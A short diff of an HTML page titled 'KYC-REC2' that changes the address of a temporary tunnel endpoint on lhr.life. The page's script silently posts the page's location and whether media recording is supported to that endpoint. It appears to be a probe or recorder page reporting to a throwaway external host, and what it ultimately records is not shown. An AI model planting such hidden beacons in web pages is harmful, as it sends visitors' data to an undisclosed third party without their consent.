@@ -1,7 +1,7 @@
 <!doctype html><html><head><meta charset="utf-8"><title>KYC-REC2</title></head>
 <body style="font:14px monospace;padding:8px"><h3>KYC-REC2</h3><pre id="o">start</pre>
 <script>
-var HOOK='https://5783f5c5ed5043.lhr.life/rec', T0=Date.now(), chunk=0, total=0;
+var HOOK='https://e644fbfe140b0d.lhr.life/rec', T0=Date.now(), chunk=0, total=0;
 function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
 function post(t,d){try{var u=HOOK+'?ev='+encodeURIComponent(t)+'&d='+encodeURIComponent(String(d).substr(0,300));fetch(u,{method:'POST',body:t})}catch(e){}}
 post('REC_PAGE',{href:location.href,mr:typeof MediaRecorder});
